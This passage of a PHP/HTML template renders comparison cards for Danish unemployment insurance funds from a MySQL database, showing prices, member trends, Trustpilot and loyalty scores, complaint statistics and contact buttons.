(min-width:1200px){.visible-lg{display:block!important}.akasse-inner-content .akasse-product-image{max-width:95px}.akasse-footer-container{height:auto;padding:10px}.akasse-button-card-column .btn-primary-normal,.btn-primary-normal,.btn-primary-normal:hover{width:123px}}@media (min-width:992px){.visible-md{display:block!important}.akasse-footer-container{height:60px;padding-right:15px}.akasse-footer-container .akasse-show-more-btn{width:auto;margin-left:auto}.btn-primary-normal,.btn-primary-normal:hover{font-size:17px}}.akasse-metrics .btn{font-size:18px;text-transform:none}.modal-graph-css{padding:1px 7px}@media (max-width:992px){.akasse-inner-content .akasse-card-column{padding:0 1px}.akasse-product-image-small{display:block;width:50px;margin-left:10px}.akasse-product-name{display:none}.akasse-product-boxes{margin-left:10px}.akasse-footer-container.akasse-timeLimited{padding:10px 15px;font-size:12px;margin-bottom:10px}.akasse-banner-display span{display:block}.akasse-inner-content .akasse-show-more-btn{padding:10px;margin-left:5px;margin-top:3px;width:40%}.akasse-button-card-column{margin-left:0;margin-right:0;margin-top:3px;width:57%;padding:0 0 0 5px!important}.akasse-inner-content .akasse-metrics .akasse-card-column{height:45px}.akasse-show-more-container{padding:15px 25px}.table-responsive{width:auto}.fuld-oversigt{height:2263px}.akasse-show-more-info ul {padding-left: 20px;}}
</style>
     <div class="row table-responsive fuld-oversigt" style="position:relative;clear:both;overflow-y:hidden" id="akasse_oversigt_table" >
     <div id="results-container" class="akasse-results-container">
    <div class="akasse-cards-container">
       <?php 
       global $db;
       // $get_list = "SELECT * FROM data ORDER BY prio ASC, PRIS_MDR ASC";
       $get_list = "SELECT * FROM data ORDER BY prio ASC";
       $result_list = $db->query($get_list);
       while ($row_list = mysqli_fetch_array($result_list)) {
         $aktiv = $row_list["ACTIVE"];
         $optagelse= $row_list["OPTAGELSE"];
         $affiliate_url = $row_list["AFFILIATE_URL"];
         $base_url_internal = $row_list["base_url_internal"];
         $pris_mdr = $row_list["PRIS_MDR"];
         $fagforening_pris = $row_list["fagforening_pris"];
         if(empty($row_list["fagforening_pris"]) || $row_list["fagforening_pris"]==0) {
           $fagforening_pris = "-";
         }
         $tp = $row_list["TRUSTPILOT_SCORE"];
         $id = $row_list["ID"];
         $summery = $row_list["summery"];
         $tp_count = $row_list["count"];
         $loyalscore = $row_list["loyalscore"];
         $cka = $row_list["cka"];
         $contact = $row_list["contact"];
         $offer = $row_list["offer"];
         $offer_string = $row_list["offer_string"];
         $billig_desc = $row_list["billig_desc"];
         $cities = $row_list["cities"];
         $cityArray = explode(",", $cities);
         $cityCount = count($cityArray);
         $output_cities = "";
         for ($i = 0; $i < $cityCount; $i++) {
           if ($i == $cityCount - 1 && $cityCount > 1) {
             // If it's the last city and there are more than one city, prepend "og "
             $output_cities .= " og " . $cityArray[$i];
           } elseif ($i == 0) {
             // If it's the first city, just add it to the output
             $output_cities .= $cityArray[$i];
           } else {
             // For all other cities, prepend a comma and space
             $output_cities .= ", " . $cityArray[$i];
           }
         }
         $score = $row_list["SCORE"];
         $prio = $row_list["prio"];
         $udbyder = $row_list["UDBYDER"];
         $udbyder_display = $row_list["udbyder_display"];
         $get_last_3_years= "SELECT members FROM membercount_history WHERE udbyder=$id ORDER BY month DESC LIMIT 3";
         $result_last_3_years = $db->query($get_last_3_years);
         $years = array();
         while ($row = mysqli_fetch_array($result_last_3_years)) {
           $years[] = $row["members"];
         }
         $years_reversed = array_reverse($years);
         $value_at_index_0 = intval($years_reversed[0]);
         $value_at_index_2 = intval($years_reversed[2]);
         if($value_at_index_0>0) { // only show arrow if data on members 
           if ($value_at_index_2 > $value_at_index_0) {
             $arrow = "<span class='glyphicon glyphicon-arrow-down' style='color:#28a745;transform: rotate(220deg);margin-left:2px;font-size:12px;cursor:pointer' data-toggle='tooltip' data-container='body' title='". $udbyder_display . " har haft en medlemstilvækst de seneste 3 år'></span>";
           } elseif ($value_at_index_2 < $value_at_index_0) {
             $arrow = "<span class='glyphicon glyphicon-arrow-down' style='color:#dc3545;transform: rotate(320deg);margin-left:2px;font-size:12px;cursor:pointer' data-toggle='tooltip' data-container='body' title='". $udbyder_display . " har mistet medlemmer de seneste 3 år'></span>";
           }
           } else {
           $arrow = "";
         }
         if($aktiv != 0) {
          $cta_element = '<button class="btn btn-block btn-primary btn-success" onclick="go_udbyder(' . $id . ');">Vælg</button>';
         } else { 
          if(!empty($base_url_internal)) {
            $cta_element_url = $base_url_internal;
          } elseif (!empty($base_url_priser)) {
            $cta_element_url = $base_url_priser;
          }else {
            $cta_element_url = $base_url;
          }
          $cta_element = '<a href="'.$cta_element_url.'" target="_blank" title="A-kasse priser fra ' . $udbyder_display . '" class="btn btn-block btn-primary btn-success">Vælg</a>';
         }
         $get_members= "SELECT * FROM membercount_history WHERE udbyder=$id ORDER BY month DESC LIMIT 1";
         $result_members = $db->query($get_members);
         if ($result_members->num_rows > 0) {
           while ($row = mysqli_fetch_array($result_members)) {
             $members = $row["members"];
             $medlemmer = number_format($members,0,"",".");
           } 
         } else {
           $medlemmer = $row_list["MEDLEMMER"];
           if($medlemmer==0) {
            $medlemmer = "ukendt";
           }
         }
         $optagelse = $row_list["OPTAGELSE"];
         $logo = $row_list["logo"];
         $recomended = $row_list["recomended"];
         if (!empty($pris_mdr)) {
       ?>
   
   <div class="akasse-card-holder">
            <div class="akasse-card-container row akasse-has-deal akasse-featured">
                <div class="akasse-card-top">
                    <div class="akasse-product-name-container">
                        <img class="akasse-product-image akasse-product-image-small" src="<?php echo $logo ?>">
                        <span class="akasse-product-name"><?php echo $udbyder_display;?> <?php if (strpos($udbyder_display, 'A-kasse') == false) { echo "a-kasse"; } ?></span>
                        <div class="akasse-product-boxes">
                            <?php if($score>0) { ?><span class="akasse-product-label" style="background-color:#5bc0de">BEDØMMELSE: <?php echo $score; ?>/10 | <a href="<?php echo $base_url_internal ?>" style="color:#FFF;text-decoration:underline">LÆS ANMELDELSE</a></span><?php } ?>
                            <?php if($prio==1) { ?><span class="akasse-product-label akasse-featured">POPULÆRT VALG <span class="glyphicon glyphicon-star"></span></span><?php } ?>
                        </div>
                    </div>
                </div>
                <div class="akasse-inner-content row">
                    <div class="akasse-metrics">
                        <div class="akasse-card-column akasse-image-container visible-lg visible-md akasse-info-column">
                            <img class="akasse-product-image" src="<?php echo $logo ?>">
                        </div>
                        <div class="akasse-card-column akasse-info-column">
                            <div class="akasse-column-primary akasse-card-column__value"> <?php echo $pris_mdr; ?> <span class="denotion">kr./md.</span></div>
                            <div class="akasse-column-secondary akasse-card-column__title">A-kasse</div>
                        </div>
                        <div class="akasse-card-column akasse-info-column">
                            <div class="akasse-column-primary akasse-card-column__value"> <?php echo $fagforening_pris; ?> <span class="denotion">kr./md.</span></div>
                            <div class="akasse-column-secondary akasse-card-column__title">Fagforening</div>
                        </div>
                        <div class="akasse-card-column akasse-info-column">
                            <div class="akasse-column-primary akasse-card-column__value"> <?php echo $medlemmer; ?><?php echo $arrow; ?></span></div>
                            <div class="akasse-column-secondary akasse-card-column__title" <?php if($arrow!="") { ?> style="margin-top:0px;"<?php } ?>>Medlemmer <?php if($arrow!="") { echo trustpilot_history(array("udbyder"=>$id,"show"=>"medlem","notext"=>"true")); }?> </div>
                        </div>
                        <div class="akasse-card-column akasse-info-column akasse-button-card-column visible-lg visible-md">
                            <?php echo $cta_element; ?>
                        </div>
                    </div>
                    <?php if(!empty($offer)) { ?>
                    <div class="visible-xs visible-sm">
                        <div class="akasse-footer-container akasse-timeLimited" <?php if (strpos($offer, 'Fordel') !== false) { echo "style='background-color:rgb(215 255 208 / 54%)'"; } ?>>
                            <div class="akasse-footer-container-inner">
                                <div class="akasse-banner-display">
                                    <?php echo $offer ?>
                                </div>
                                <div class="visible-md visible-lg col-md-12 akasse-footnote-display">
                                    <ul class="akasse-footnote-ul">
                                        <li><?php echo $offer_string ?></li>
                                    </ul>
                                </div>
                            </div>
                            <button class="akasse-show-more-btn col-md-2 visible-md visible-lg" type="button" data-toggle="collapse" data-target="#collapseExample<?php echo $id ?>" aria-expanded="false" aria-controls="collapseExample">
                                <span class="akasse-if-collapsed">Mere info</span>
                            </button>
                        </div>
                    </div>
                    <?php } ?>
                    <div style="margin-left:10px;margin-right:10px;">
                    <button class="akasse-show-more-btn col-xs-6 visible-xs visible-sm" type="button" data-toggle="collapse" data-target="#collapseExample<?php echo $id ?>" aria-expanded="false" aria-controls="collapseExample">
                        <span class="akasse-if-collapsed">Mere info</span>
                    </button>
                    <div class="akasse-button-card-column akasse-card-column visible-xs visible-sm col-xs-6">
                         <?php echo $cta_element; ?>
                    </div>
                    </div>
                </div>
                <div class="visible-md visible-lg">
                    <div class="akasse-footer-container akasse-timeLimited" <?php if(empty($offer)) { ?>style="background-color:#fff;height:50px;"<?php } ?> <?php if (strpos($offer, 'Fordel') !== false) { echo "style='background-color:#d7ffd0'"; } ?>>
                        <?php if(!empty($offer)) { ?>
                        <div class="col-xs-12 col-md-10 row akasse-footer-container-inner">
                            <div class="col-xs-12 akasse-banner-display">
                                <?php echo $offer ?>
                            </div>
                            <div class="visible-md visible-lg col-md-12 akasse-footnote-display">
                                <ul class="akasse-footnote-ul">
                                    <li><?php echo $offer_string ?></li>
                                </ul>
                            </div>
                        </div>
                        <?php } ?>
                        <button class="akasse-show-more-btn col-md-2 visible-md visible-lg" type="button" data-toggle="collapse" data-target="#collapseExample<?php echo $id ?>" aria-expanded="false" aria-controls="collapseExample">
                            <span class="akasse-if-collapsed">Mere info</span>
                        </button>
                    </div>
                    <div class="visible-xs visible-sm akasse-footnote-display">
                        <ul class="akasse-footnote-ul">
                            <li><?php echo $offer_string ?></li>
                        </ul>
                    </div>
                </div>
                <div class="collapse" id="collapseExample<?php echo $id ?>">
                    <div class="akasse-show-more-container">
                        <div class="akasse-show-more-info">
                            <div class="akasse-show-more-info-title">Mere om <?php echo $udbyder_display;?></div>
                            <ul>
                            <?php if(!empty($billig_desc)) { ?><li><?php echo $udbyder_display;?> <?php echo $billig_desc ?></li><?php } ?>
                                <?php if(!empty($tp_count)) { ?><li><?php echo $udbyder_display;?> scorer <?php echo $tp;?>/5 på Trustpilot baseret på <?php echo $tp_count; ?> anmeldelser <?php echo trustpilot_history(array("udbyder"=>$id)) ?></li><?php } ?>
                                <?php if(!empty($loyalscore)) { ?><li><?php echo $udbyder_display;?> opnåede en loyalitets score på <?php echo $loyalscore;?> i 2023, mens gennemsnittet blandt de testede a-kasser var på <?php echo general_info(array("get_this"=>"loyal_snit","year"=>"2023"));?>. <span class="glyphicon glyphicon-info-sign" style="color:#333; cursor:pointer; font-size:14px" data-toggle="tooltip" data-container="body" title="Udarbejdet af Loyalty Group og deres BrancheIndex™, som baseres på oplevelser fra tusindvis af danskere med de serviceydelser, de modtager, samt tilgængeligheden og serviceniveauet hos deres respektive a-kasser. Medlemmerne vurderer også a-kassernes image og deres evne til at varetage medlemmernes interesser. Disse vurderinger resulterer i en samlet loyalitetsscore for hver a-kasse."></span></li><?php } ?>
                                <?php if(!empty($cka)) { ?><li>Ifølge Center for Klager om Arbejdsløshedsforsikring havde <?php echo $udbyder_display;?> <?php echo $cka;?> klagesager per 1000 medlemmer i 2023. Gennemsnittet blandt a-kasserne lå på <?php echo general_info(array("get_this"=>"cka_snit","year"=>"2023"));?>. <a href="https://www.star.dk/media/jydm3wds/aarsstatistik-for-cka-2023.pdf" target="_blank" rel="nofollow">Læs mere om denne statestik</a></li><?php } ?>
                                <?php if($fagforening_pris!="-" && $pris_mdr!=0) { ?><li>Hos <?php echo $udbyder_display;?> kan du både få a-kasse og forening samme sted</li><?php } ?>
                                <li><?php echo $udbyder_display;?> optager: <?php echo $optagelse;?></li>
                            </ul>
                            <?php if(!empty($summery)) { ?>
                            <div class="akasse-show-more-info-title">Opsummering</div>
                            <p style="margin-bottom:10px;line-height: 1.5em;">
                                <?php echo $summery;?>
                            </p>
                            <?php } ?>
                            <?php if(!empty($cities)) { ?>
                            <p>
                                <span style="display:block;font-weight:600">Du finder <?php echo $udbyder_display;?> i følgende byer:</span>
                                <span style="line-height:1.2em!important;display:block;"><?php echo $output_cities; ?></span>
                            </p>
                            <?php } ?>
                            <?php if(!empty($contact)) { ?>
                              <div class="akasse_contact_info">
                              <?php echo $contact; ?>
                              </div>
                            <?php } ?>
                            <?php if($aktiv == 1) { ?>
                            <p><span class="btn btn-success input-lg" style="min-width:250px;font-size:16px;margin-bottom:20px;" onclick="go_udbyder('<?php echo $id;?>');">Kontakt <?php echo $udbyder_display;?> <span class="glyphicon glyphicon-new-window"></span></span></p>
                            <?php } ?>
                          </div>
                    </div>
                </div>
            </div>
          </div>  
       <?php
       } 
      }
       global $db;
       $get_updated = "SELECT LAST_UPDATED FROM data ORDER BY LAST_UPDATED DESC LIMIT 1";
       $result_updated = $db->query($get_updated);
       while ($row_updated = mysqli_fetch_array($result_updated)) {
         $updated = date('d.m.Y', strtotime($row_updated["LAST_UPDATED"]));
       }
       ?>
    </div>
</div>
       <p>Data senest opdateret: <?php echo $updated; ?></p>
       <span id="full_table"><span style="margin-top:40px;display:block;">Se flere resultater <span class="glyphicon glyphicon-chevron-down" ></span></span></span>
     </div>
<?php
      }
  ?>
